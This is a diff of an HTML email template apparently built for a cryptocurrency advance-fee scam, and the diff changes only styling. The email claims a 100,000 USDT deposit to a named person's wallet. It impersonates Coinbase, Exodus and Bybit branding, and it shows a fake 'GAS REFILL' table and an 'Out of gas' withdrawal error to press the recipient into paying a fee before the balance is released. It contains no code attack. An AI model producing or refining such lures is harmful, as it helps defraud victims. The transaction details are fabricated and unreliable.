@@ -1,7 +1,7 @@
 <head>
 <H2 align="center">USDT Deposit Notification</H2>
  </head>
-<body style="margin:0; padding:0px; background-color:#f6f9fc; font-family: Arial, sans-serif;">
+<body style="background-color:#f6f9fc; font-family: Arial, sans-serif;">
 
   <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f6f9fc;">
     <tr>
@@ -10,7 +10,7 @@
       
 <!------------- Header --------------->
  
-  <td align="center" style="padding: 10px;">
+  <td align="center">
               <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
             </td>
           </tr>
@@ -19,33 +19,33 @@
 <!-------------- Body ---------------->
          
    <tr>
-            <td align="center" class="content" style="padding: 20px 40px;">
-              <h2 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h2>
-              <p style="font-size:16px; color:#555555; margin:0;">You've received a deposit of</p>
-              <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
+            <td align="center" class="content" style="">
+              <h2 style="color:#333333;font-size:24px;">Deposit Received</h2>
+              <p style="font-size:16px; color:#555555;" >You've received a deposit of</p>
+              <p style="font-size:28px; color:#05a5f0;"><strong>100,000 USDT</strong></p>
               
 <!-------------- TNX ---------------->
               
-<table style="margin: 0 auto; width: 100%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+<table style= border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
     <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Transaction Reference:</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">e3019139-5efd-4ae1-ad70-b645454404f</td>
+      <td style="text-align: left; border-bottom: 1px solid #ddd;"><strong>Transaction Reference:</strong></td>
+      <td>e3019139-5efd-4ae1-ad70-b645454404f</td>
     </tr>
     <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Date:</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">May/24/2025</td>
+      <td><strong>Date:</strong></td>
+      <td>May/24/2025</td>
     </tr>
     <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Asset:</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">USDT</td>
+      <td><strong>Asset:</strong></td>
+      <td>USDT</td>
     </tr>
     <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Recipient Account:</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</td>
+      <td><strong>Recipient Account:</strong></td>
+      <td>TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</td>
     </tr>
     <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>User Name:</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">Marlon Baltazar</td>
+      <td><strong>User Name:</strong></td>
+      <td>Marlon Baltazar</td>
     </tr>
   </table>
 
@@ -59,7 +59,7 @@
     <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
 <h4>GAS REFILL</h4>
-<table style="margin: 0 auto; width: 100%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+<table style="border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
     <tr>
         <th colspan="2">TETHER GAS (estimated):</th>
       </tr>
@@ -104,7 +104,7 @@
 
 <div style="text-align: center;">
   <span style="color: RED;"><strong>ERROR!!!</strong></span>
-    <p style="margin: 10px 0;"> ⏬ </p>
+       <p> ⏬ </p>
    <span style="color: Red;">Warning! Error encountered during Withdraw execution [Out of gas]⚠️</span>
    
 </div>
@@ -123,7 +123,7 @@
 <img src="IMG_0574.png" alt="blockchain Logo" width="15" />
     <br>
 <div style="text-align: center;">
-  <img src="IMG_0577.png" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+  <img src="IMG_0577.png" alt="blockchain Logo" width="320"/>
 </div>
   <br>
 <form action="https://www.bybit.com/en/login" method="get">
@@ -140,7 +140,7 @@
 </div>
 
  <div style="text-align: center;">
-  <img src="IMG_0561.png" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+  <img src="IMG_0561.png" alt="blockchain Logo" width="320" />
 </div>
 
 <!-------------- Buttons -------------->
@@ -157,6 +157,6 @@
  © 2025 Exodus.com, Inc. All rights reserved.<br/>
             ® PRIVACY POLICY
 
-<br>
+<span>
 
   <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" align="center" />
